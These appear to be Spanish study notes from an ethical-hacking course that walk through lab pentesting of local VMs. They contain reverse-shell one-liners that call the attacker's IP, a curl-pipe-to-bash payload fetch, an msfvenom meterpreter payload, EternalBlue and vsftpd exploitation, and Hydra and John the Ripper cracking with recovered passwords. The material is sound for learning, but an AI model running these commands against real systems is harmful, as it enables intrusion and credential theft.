[https://www.youtube.com/watch?v=7ejIdyu8hug](https://www.youtube.com/watch?v=7ejIdyu8hug)

1:13:06

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

FormulaHacking

Redes de clase a b y c

c = 192.168.0.1

mask = se divide una porcion de red y de host 255.255.255.0

este tipo de red tiene capacidad hasta 255 host para poner y se representa con un slash /24

Redes de clase b = 255.255.0.0 172.16.0.0=/16

son redes para implementar en empresas grandes por la cantidad de porciones de host habilitadas a implementar

Redes de clase A = 10.0.0.0 255.0.0.0 = /8

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# NETCAT
# Uso de Netcat para entablar Reverse Shell
search web “revshells.com”

![file:///tmp/.79UXO2/1.png](file:///tmp/.79UXO2/1.png)

Poner la ip de nuestra M.Att y el puerto que querramos

genera el comando

sh -i >& /dev/tcp/192.168.0.82/443 0>&1	

Desde kali linux

#nc -nlvp 443

Nos ponemos en escucha por el puerto 443, esperando una conexion

desde M.V ejecuto

sh -i >& /dev/tcp/192.168.0.82/443 0>&1	

y por consola de M.A obtenemos acceso a la maquina

No me funciono en metasploitable, pero si en lubuntu

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Servicio web de Python para Comunicarse en la Red

Una vez hayamos obtenido ejecución remota de comandos en un servidor, suele ser necesario poder transferir archivos al objetivo o incluso ayudarnos de un servidor web para obtener la reverse shell, por lo que en esta clase veremos de forma breve cómo levantar un servidor HTTP con python para lograr esto mismo.

en mi maquina atacate, voy a crear un payload que se llame “payload.sh”

lo abrimos con nano, #!/bin/bash

ponemos el tipico script de revershell

sh -i >& /dev/tcp/192.168.0.2/443 0>&1

guardar y ahora quiero compartirlo con la victima para que lo ejecute...

para eso esta este bello comando

python3 -m http.server 80	

esto va a levantar un servidor por el puerto 80 con todos los archivos que se encuentren en el actual directorio

Ahora corre un servidor web corriendo por el p 80 compartiendo archivos

Si vamos a la maquina victima, abrimos el navegador y ponemos la ip de la maquina atacante que en este caso es 192.168.0.82, se accede al archivo que esta compartiendo desde la maquina atacante

De tal forma que si le damos click al enlace se descarga

[ si tuviera ejecucion remota de la maquina victima, dentro de la terminal podria ejecutar lo siguiente

curl http://192.168.0.82/payload.sh | bash 

Escuchando desde la maquina atacante con

nc -vlnp 443

Hacemos una peticion al servidor web donde se esta compratiendo el archivo y luego una vez obtenido el archivo, se va interpretar con bash

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Reconocimiento de la red con ARP-SCAN o NETDISCOVER

arp-scan  
arp-scan -I eth0 --localnet 

Tambien se puede utilizar solo la IP

arp-scan 192.168.0.1/24

Cuando lanzamos el escaneo y el resultado aparace como unknown, las maquinas virtuales comienzan con la mac 08:00

En los resultados del escaneo nos pueden aparecer varias IP, le hacemos un ping a cada una con el parametro -c 1 192.168.0.21

el ttl =128 resultante indica que es microsoft y si el ttl=64 es linux

lo mismo sucede con

netdiscover -i wlan0 -r 192.168.0.0/24 

.0/24??? why?? cuz yes

pero se puede poner

netdiscover

sin otro parametro que el resultado es el mismo

tambien hace lo propio nmap:

nmap -sn 192.168.0.1/24

es recomendable utilizar las 3 herramientas por si hay una ip que una no encuentre o mismo para dar mas detalles

![file:///tmp/.79UXO2/2.png](file:///tmp/.79UXO2/2.png)

/////////////////////////////////////////////////////////////////

arp-scan -I waln0 --localnet  
  
netdiscover -i wlan0 -r 192.168.0.0/24  
  
nmap -sn 192.168.0.0/24 > -oN text.txt

/////////////////////////////////////////////////////////////////

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escaneos B├ísicos con Nmap

Una vez hayamos identificado nuestros objetivos, es necesario realizar un reconocimiento de puertos en cada una de las máquinas objetivo, de tal forma que podremos identificar servicios vulnerables que estén corriendo en los puertos, así como la versión de cada uno de ellos, lo cual podemos utilizarlo más tarde para buscar alguna herramienta o exploit que nos permita explotar las distintas vulnerabilidades.

nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 192.0.0.0 -oN scanned.txt  

-n es para obviar al dns

-sS superfast

--min-rate 2000 va ir lento pero seguro

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escaneo de Vulnerabilidades con Nmap

También podemos utilizar nmap para poder encontrar vulnerabilidades de una máquina objetivo mediante el uso de scripts automatizados. En esta clase, vamos a aprender a utilizar el script ‘vuln’ para obtener el CVE o identificación de las vulnerabilidades que puedan estar presentes en la máquina víctima.

nmap --script "vuln" -p445 192.1.1.1 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Escaneo de Puertos bajo el Protocolo UDP

Otra forma de escanear puertos con nmap es mediante el protocolo UDP, donde es posible que haya otros puertos funcionando en la máquina, por lo que en esta clase aprenderemos qué parámetro de nmap debemos de utilizar para realizar un escaneo de puertos de este tipo.

esto solo ve el TCP

└─# nmap -p- -sS -sC -sV --open --min-rate 4500 -Pn -vvv -n 192.168.0.164 

La idea es ver UDP, entonces

nmap -sU --top-ports 200 --min-rate=5000 -Pn 192.168.0.164 

se entiende todo. top-ports 200 son los 200 puertos mas comunes en los que corre udp

snmp es un protocolo para gestionar router or modems remotos

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EXPLOTACION DE VULNERABILIDADES Y USO DE FUERZA BRUTA

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso Básico de Metasploit – Explotación EternalBlue en Windows

En esta clase, comenzamos a utilizar metasploit para realizar una explotación de vulnerabilidades de la máquina víctima windows 7 que hemos instalado anteriormente, por lo que identificaremos primero la vulnerabilidad de eternalblue; y posteriormente con metasploit realizaremos la explotación de la vulnerabilidad hasta obtener acceso e intrusión a la máquina víctima.

### Escaneo

arp-scan -I wlan0 --localnet  
netdiscover -i wlan0 -r 192.168.0.0/24  
nmap -sn 192.168.0.0/24

### Resultados

arp-scan 192.168.0.152 08:00:27:55:68:4c (Unknown)

netdiscover 192.168.0.152 08:00:27:55:68:4c 2 84 PCS Systemtechnik GmbH

Nmap scan report for mario-PC.fibertel.com.ar (192.168.0.152)

Host is up (0.0011s latency).

MAC Address: 08:00:27:55:68:4C (Oracle VirtualBox virtual NIC)

### Objetivo

: 192.168.0.152

└─# ping -c 1 192.168.0.152 -R  
PING 192.168.0.152 (192.168.0.152) 56(124) bytes of data.  
64 bytes from 192.168.0.152: icmp_seq=1 ttl=128 time=3.36 ms  
  
--- 192.168.0.152 ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 3.361/3.361/3.361/0.000 ms  

### OS = TTL = 128 = WINDOWS

nmap -sS -sC -sV -p- --open --min-rate 2000 -Pn -vvv -n 192.168.0.152 -oN 192.168.0.152.txt

PORT     STATE SERVICE      REASON          VERSION  
135/tcp  open  msrpc        syn-ack ttl 128 Microsoft Windows RPC  
139/tcp  open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn  
445/tcp  open  microsoft-ds syn-ack ttl 128 Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)  
5000/tcp open  upnp?        syn-ack ttl 128  
5357/tcp open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Service Unavailable  
MAC Address: 08:00:27:55:68:4C (Oracle VirtualBox virtual NIC)  
Service Info: Host: MARIO-PC; OS: Windows; CPE: cpe:/o:microsoft:windows  
  
Host script results:  
| smb-os-discovery:   
|   OS: Windows 7 Ultimate 7601 Service Pack 1 (Windows 7 Ultimate 6.1)  
|   OS CPE: cpe:/o:microsoft:windows_7::sp1  
|   Computer name: mario-PC  
|   NetBIOS computer name: MARIO-PC\x00  
|   Workgroup: WORKGROUP\x00  
|_  System time: 2024-03-21T11:11:35-07:00  
|_clock-skew: mean: -20d08h13m04s, deviation: 4h02m29s, median: -20d10h33m05s  
| smb2-time:   
|   date: 2024-03-21T18:11:34  
|_  start_date: 2024-03-21T22:12:02  
| nbstat: NetBIOS name: MARIO-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:55:68:4c (Oracle VirtualBox virtual NIC)  
| Names:  
|   MARIO-PC<20>         Flags: <unique><active>  
|   MARIO-PC<00>         Flags: <unique><active>  
|   WORKGROUP<00>        Flags: <group><active>  
|   WORKGROUP<1e>        Flags: <group><active>  
|   WORKGROUP<1d>        Flags: <unique><active>  
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>  
| Statistics:  
|   08:00:27:55:68:4c:00:00:00:00:00:00:00:00:00:00:00  
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00  
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00  
| p2p-conficker:   
|   Checking for Conficker.C or higher...  
|   Check 1 (port 62626/tcp): CLEAN (Timeout)  
|   Check 2 (port 56157/tcp): CLEAN (Timeout)  
|   Check 3 (port 58674/udp): CLEAN (Timeout)  
|   Check 4 (port 42482/udp): CLEAN (Timeout)  
|_  0/4 checks are positive: Host is CLEAN or ports are blocked  
| smb2-security-mode:   
|   2:1:0:   
|_    Message signing enabled but not required  
| smb-security-mode:   
|   account_used: guest  
|   authentication_level: user  
|   challenge_response: supported  
|_  message_signing: disabled (dangerous, but default)  

nmap -sU --top-ports 200 --min-rate 2000 -Pn 192.168.0.152

Nmap scan report for mario-PC.fibertel.com.ar (192.168.0.152)  
Host is up (0.00026s latency).  
Not shown: 199 open|filtered udp ports (no-response)  
PORT    STATE SERVICE  
137/udp open  netbios-ns  
MAC Address: 08:00:27:55:68:4C (Oracle VirtualBox virtual NIC)  

nmap --script "vuln" -p445 192.168.0.152

PORT STATE SERVICE

445/tcp open microsoft-ds

MAC Address: 08:00:27:55:68:4C (Oracle VirtualBox virtual NIC)

Host script results:

|_smb-vuln-ms10-054: false

| smb-vuln-ms17-010:

| VULNERABLE:

| Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)

| State: VULNERABLE

| IDs: CVE:CVE-2017-0143

| Risk factor: HIGH

| A critical remote code execution vulnerability exists in Microsoft SMBv1

| servers (ms17-010).

|

| Disclosure date: 2017-03-14

| References:

| https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

| https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED

|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED

msfdb_init && msfconsole -q

inicia la base de datos de metasploit, metasploit sin banner molesto y rapido

search CVE-2017-0143

etternalblue

elegir alguna options

set RHOSTS or RPORTS and RUN

da una sesion de meterpreter

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso Básico de Metasploit – Explotación vsftpd en Linux

A continuación, realizamos la explotación de vulnerabilidades de una máquina Linux conocida como ‘Metasploitable2’ la cual se trata de una máquina que presenta multitud de vulnerabilidades, lo que nos permite practicar pentesting de una forma sencilla.

En esta ocasión, tras realizar un escaneo de puertos, veremos que el puerto 21 FTP se encuentra abierto y cuenta con una versión vulnerable, que será lo que utilicemos para realizar la explotación.

ifconfig  
hostname -I  
  
arp-scan -I wlan0 --localnet  
netdiscover -i wlan0 -r 192.168.0.0/24  
nmap -sn 192.168.0.0./24  
  
192.168.0.18  
  
ping -c 1 192.168.0.18  
  
ttl=64  
  
nmap -sS -sC -sV -p- --open --min-rate 2000 -Pn -vvv -n 192.168.0.18 -oN text.txt  
  
puerto 21 open [ftp]  
  
nmap --script "vuln" -p21 192.168.0.18  
  
CVE-2011-2523  
  
msfdb_init && msfconsole -q  
  
search CVE-2011-2523  
  
No results from search  
  
msf6 > search vsFTPd 2.3.4  
  
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03  
  
use 0  
  
show options  
  
set RHOSTS 192.168.0.18  
  
run  
  
whoami  
  
shell  

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Msfvenom – Generar Nuestros Propios Payloads

En esta clase, utilizaremos la herramienta msfvenom para generar un payload personalizado y así poder realizar instrusiones a los servidores de una forma distinta, donde podremos generar payloads maliciosos en distintas extensiones (php, exe, sh, etc…)

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MiIP LPORT=443 -f exe -o pwned.exe

-p = payload

python3 -m http.server 80

Abrir una maquina windows, abrir el buscador e ir a mi direccion ip (atacante) 192.168.0.82 y descargar el archivo

la coneccion se puede hacer con netcat pero en este caso la vamos hacer con multihandler

msf> use /multi/handler  
  
show options  
  
set PAYLOAD windows/x64/meterpreter/reverse_tcp/

Hay que poner el mismo payload que habiamos cargado con msfvenom

set LPORT 443

Lo mismo con el puerto

set LhoST MI IP

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

Comenzamos con el uso de la herramienta hydra, la cual nos permitir├í realizar ataques de fuerza bruta a distintos protocolos de red, de tal forma que podremos utilizar un diccionario con multitud de posibles contrase├▒as y a una velocidad muy alta ir probando una por una dentro del protocolo SSH o FTP.

maquina friendly

arp-scan -I wlan0 --localnet  
netdiscover -i wlan0 -r 192.168.0.0/24  
nmap -sn 192.168.0.0/24

Remember = p21 ftp & p22 ssh

BUSCAR USUARIOS, CHECK EL PUERTO 80

nmap -p- -sS -sV -sC --open --min-rate 2000 -Pn -vvv -n 192.168.0.193 -oN friendly.txt

21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3

22/tcp open ssh syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)

| ssh-hostkey:

80/tcp open http syn-ack ttl 64 nginx 1.22.1

En el sevidor aparece un nombre, quizas sea un usuario (juan) entonces abrimos hydra

hydra -L

en el caso de no sepa el usuario poner -L

hydra -l juan 

ahora tenemos un usuario, de forma tal que ponemos -l seguido del nombre de usuario que aparece

hydra -l juan -P

-P quiere decir que se desconoce el dato por lo tanto agregamos un diccionario

los diccionarios se encuentran

/usr/share/wordlist

y el que vamos a utilizar es el rockyou.txt pero esta comprimido

gunzip rockyou.xfz  

ahora a -P le pasamos la direccion del diccionario

hydra -l juan -P /usr/share/wordlist/rockyou.txt

le pasamos servicio al que queremos atacar en este caso ssh

hydra -l juan -P /usr/share/wordlist/rockyou.txt ssh://192.168.0.193:22

tuve que ponerle al final de la ip el puerto porque no me dejaba conectarme

Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2024-04-12 21:51:40

[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4

[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task

[DATA] attacking ssh://192.168.0.193:22/

[22][ssh] host: 192.168.0.193 login: juan password: alexis

[STAT

ssh juan@192.168.0.193

password= alexis

costo pero se pudo

<<<<

# ftp

>>>>

hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.193:21

Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) starting at 2024-04-12 22:47:26

[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task

[DATA] attacking [ftp://192.168.0.193:21/](ftp://192.168.0.193:21/)

[21][ftp] host: 192.168.0.193 login: juan password: alexis

1 of 1 target successfully completed, 1 valid password found

Hydra ([https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)) finished at 2024-04-12 22:47:56

ftp 192.168.0.193  
usr juan  
pass alexis  

Aun asi es mejor ingresar por el ssh dado que tenemos mas acceso

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso de Hydra – Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

Una vez hayamos visto cómo realizar ataques de fuerza bruta con hydra en la parte de la contraseña, también puede darse el caso en que necesitemos encontrar el usuario en caso de ya disponer de la contraseña, por lo que será justamente esto lo que haremos en la clase.

si no conocemos el usuario pero conocemos el pass.....

hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.0.193:22

VAS A USAR ESTE DICCIONARIO PARA LOS USUARIOS <<UNIX_USERS.TXT>>> LO MISMO CON <<<UNIX_PASSWORD.TXT>>>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Uso de Hydra – Ataques de Fuerza Bruta a Paneles de Login Web

En esta clase vamos a aprender cómo hacer un ataque de fuerza bruta en caso de encontrarnos ante un panel de login web, de tal forma que utilizaremos burp suite para saber cuál es la ruta exacta para llegar al panel de login y además podremos ver cómo se está tramitando el envío de las credenciales de dicha web, para posteriormente proporcionárselo a hydra para efectuar el ataque.

search [http://192.168.0.213/my_weblog/admin.php](http://192.168.0.213/my_weblog/admin.php)

nos aparece un login en el cual sabemos el usuario pero no la contrasenia, sabemos que es admin

hydra, puede ir probando los diccionarios hasta encontrar la contrasenia, pero para eso es necesario saber la direccion exacta del login php

open burpsuite que podemos interceptar una peticion http y obtener mas informacion

dentro del navegador vamos a ajustes, o configuracion, e ingresamos proxi manual, con el localhost corriendo por el puerto 8080

luego, volvemos a burpsuite en la opcion de proxi - intercept is on, ahora burpsuite esta entre el navegador y el sevidor

volvemos a weblog/admin.php agregamos el usuario que ya sabemos, admin y en contrasenia ponemos cualquier cosa

de esta forma burpsuite nos captura la peticion

POST /my_weblog/admin.php HTTP/1.1

Host: 192.168.0.213

User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: [http://192.168.0.213/my_weblog/admin.php](http://192.168.0.213/my_weblog/admin.php)

Content-Type: application/x-www-form-urlencoded

Content-Length: 29

Origin: [http://192.168.0.213](http://192.168.0.213)

Connection: clos

Cookie: PHPSESSID=hihj0s7kehltan35fqj3egl585

Upgrade-Insecure-Requests: 1

username=admin&password=admon

ahora

hydra -t 64 -l admin -P <diccionario> <ip> http-post-form “/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect”

hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.213 http-post-form /my_weblog/admin.php:username=admin&password=^PASS^

-t 64 es para que vaya mas rapido de lo normal

http-post-form = es el metodo que se utilizo, puede ser post, get, etc

/my_weblog/admin.php = es la ruta exacta del login

se pega seguido el usrname&password

username=admin&password=^PASS^ = este es el dato que no se y quiero averiguar, por eso se lo pone entre esos simbolos

ahora tenemos que ver el login y copiar el mensaje de error, para despues pegarlo junto con el script

Incorrect username or password.

hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.0.213 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password." 

remember las comillas

pim pam pum

[80][http-post-form] host: 192.168.0.213 login: admin password: kisses

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Ataques de Fuerza Bruta con Metasploit

En esta clase, veremos otra forma de realizar ataques de fuerza bruta utilizando metasploit, la cual también tiene módulos que nos permite realizar los mismos ataques que realizábamos con hydra, pero esta vez con metasploit.

## SSH

open metasploit

msf> search ssh_loggin

En la maquina friendly 3 el usuario es “juan” entonces fijamos parametros set USERNAME juan y en pass la ruta del diccionario

msf> auxiliary(scanner/ssh/ssh_loggin) > set PASS_FILE /usr/share/wordlists/rockyou.txt

msf> auxiliary(scanner/ssh/ssh_loggin) > set RHOSTS <iptarget>

METASPLOIT ES MAS LENTO QUE HYDRA PARA HACER ATAQUES DE FUERZA BRUTA

## FTP

msf> search ftp_login

msf> auxiliary(scanner/ftp/ftp_login)> 

Es practicamente igual, user, pass, rhosts/ es preferible quitarle el verbose porque hace mas lento la maquina osea / set verbose false

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Ataques de Fuerza Bruta contra Bases de Datos

En esta clase, también aprenderemos cómo realizar un ataque de fuerza bruta si nos encontramos con una máquina que tenga abierto algún puerto donde corra una base de datos, por lo que realizaremos otro ataque de fuerza bruta para obtener la contraseña de la base de datos y luego poder entrar.

Enlace a la plataforma de comunidad hacking ético para obtener la máquina “CapyPenguin”:

https://ctf.comunidadhackingetico.es/challenges?category=medio

Enlace directo de descarga:

https://drive.google.com/file/d/1kJsjmttn7McRuj8Tx71ootLMnTnaIWo4/view?usp=sharing

$arp-scan -I wlan0 --localnet  
  
$ping -c ip  
  
$nmap -p- -sC -sV -sS --open --min-rate 2000 -v -n target

Por el puerto 3306 corre mysql

Primero encontrar el usuario

investigar por el p80

dentro del browser poner la ip y con el atajo de teclado crtl + u se accede al codigo fuente

invertir el rockyou.txt para que el ataque comience desde atras hacia adelante

tac /usr/share/wordlists/rockyou.txt > rockyou_inverter.txt

despues de invertirlo quedan en el fichero rockyou_inverter.txt algunos simbolos y espacios que van a dificultar el ataque entonces a los simbolos los borramos manualmente

y los espacios los borramos asi:

cat rockyou_inverter.txt | tr -d ' ' > dicctionary_whithout_space.txt

entonces se le puede pasar el parametro siguiente :

hydra -l admin -P dicctionary_without_space.txt mysql://192.168.0.2:3306

en este caso descargue una machine de vulnhub con el puerto 3306 abierto de mysql, pude hacer fuerza bruta

nos podemos conectar:

mysql -h 192.168.0.2 -u admin -p123456789

la contrasenia va pegada al parametro -p sin espacio

### **hace el curso de platzi de sql**

### porque es necesario saber la sintaxis

show databases;

muestra las bases de datos que vienen por defecto, buscar las que no lo son. Entoces supongamos que encontramos una db que se llame chupito

use chupito;

show tables;

al ver las tablas, supongamos que hay una llamada USERS entonces

SELECT * FROM users;

selecciona *todas* de la tabla users // nos va aparecer el usr y pass, entonces nos podemos conectar por ssh

En este caso no tiene el puerto 22 abierto

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Ataques de Fuerza Bruta en Local con John The Ripper

Otra forma de realizar ataques de fuerza es con la herramienta John The Ripper, la cual nos permite realizar cracking de archivos en local. Por ejemplo, es frecuente encontrarnos dentro de un servidor con algĂșn hash que podamos crackear con John The Ripper.

zip -p pass123 Solvetic.zip /home/solvetic/Documentos/

Allí debemos tener en cuenta lo siguiente:

- -p: Asigna una contraseña al archivo seleccionado.

- Pass123. Contraseña asignada.

- Solvetic.zip: Archivo a proteger.

- /home/Solvetic/Documentos: Directorio donde se encuentra el archivo.

Para mejorar la seguridad, es ideal usar el indicador -e, el cual despliega un aviso que nos permite ingresar una contraseña oculta y confirmarla así:

zip -e solvetic.zip /home/heavenblack/documents  
enter password:  
verify password:

Finalmente recordemos que para descomprimir un archivo debemos usar la siguiente sintaxis:

unzip archivo.zip

una vez creado el archivo loco pasamos a utilizar john the ripper

└─# zip2john blues.zip > hash

o

└─# keepass2john blues.zip > hash

john --wordlist=/usr/share/wordlists/rockyou.txt hash

el mismo procedimiento para keepass

HASH

[https://www.md5hashgenerator.com/](https://www.md5hashgenerator.com/)

generamos un hash de la contrasenia password1

7c6a180b36896a0a8c02787eeafb0e4c

lo guardamos dentro un fichero

si no especificamos el tipo de encriptacion que tiene quizas no funque

abrimos hash-identifiker y pegamos el hash, luego nos dira que tipo es, en este caso es MD5, asi que se lo pasamos a john

john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash

pim pam pum, encontro que tiene el password la cual es “password1”

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# **EXPLOTACION DE VULNERABILIDADES WEB**

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Qué es el Fuzzing Web – Uso de Gobuster

Una vez que hayamos accedido a una página web, es imprescindible realizar una búsqueda de directorios web para encontrar rutas donde podamos seguir accediendo y así encontrar más vulnerabilidades. Para ello tenemos herramientas como gobuster, que se ejecutan directamente desde terminal y simplemente necesita recibir la url que queramos analizar y también un diccionario.

Enlace para descargar la máquina metasploitable2:

https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

gobuster dir -u http://192.168.0.88/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 

va empezar a listar todos los ficheros que tiene la ip, en este caso listo todos estos

Gobuster v3.6

by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

===============================================================

[+] Url: http://192.168.0.88/

[+] Method: GET

[+] Threads: 10

[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

[+] Negative Status codes: 404

[+] User Agent: gobuster/3.6

[+] Timeout: 10s

===============================================================

Starting gobuster in directory enumeration mode

===============================================================

/test (Status: 301) [Size: 316] [--> http://192.168.0.88/test/]

/index (Status: 200) [Size: 891]

/twiki (Status: 301) [Size: 317] [--> http://192.168.0.88/twiki/]

/tikiwiki (Status: 301) [Size: 320] [--> http://192.168.0.88/tikiwiki/]

/phpinfo (Status: 200) [Size: 47978]

/server-status (Status: 403) [Size: 298]

Progress: 207643 / 207644 (100.00%)

Tambien se puede buscar archivos as well

gobuster dir -u http://192.168.0.88/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,py,sh

Tambien se puede hacer con DIRB pero hace una busqueda recursiva

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# EnumeraciĆ³n de Subdominios con Wfuzz

En esta clase, veremos cómo realizar una búsqueda de subdominios con más herramientas de fuzzing; y para ello lo diferenciaremos bien con la búsqueda de directorios web, ya que se tratan de conceptos distintos.

Enlace para descargar la máquina vulnerable:

https://hackmyvm.eu/machines/machine.php?vm=Logan

escaneamos y buscamos dentro del puerto 80, en la pag nos da error y en el escaneo nos aparece un archivo llamado logan.hmv

└─# nmap -p- -sS -sC -sV --open --min-rate 5000 -Pn -n 192.168.0.156

map scan report for 192.168.0.156

Host is up (0.00044s latency).

Not shown: 65533 closed tcp ports (reset)

PORT STATE SERVICE VERSION

25/tcp open smtp Postfix smtpd

|_smtp-commands: logan.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

| ssl-cert: Subject: commonName=logan

| Subject Alternative Name: DNS:logan

| Not valid before: 2023-07-03T13:46:49

|_Not valid after: 2033-06-30T13:46:49

|_ssl-date: TLS randomness does not represent time

80/tcp open http Apache httpd 2.4.52 ((Ubuntu))

|_http-server-header: Apache/2.4.52 (Ubuntu)

|_http-title: Site doesn't have a title (text/html).

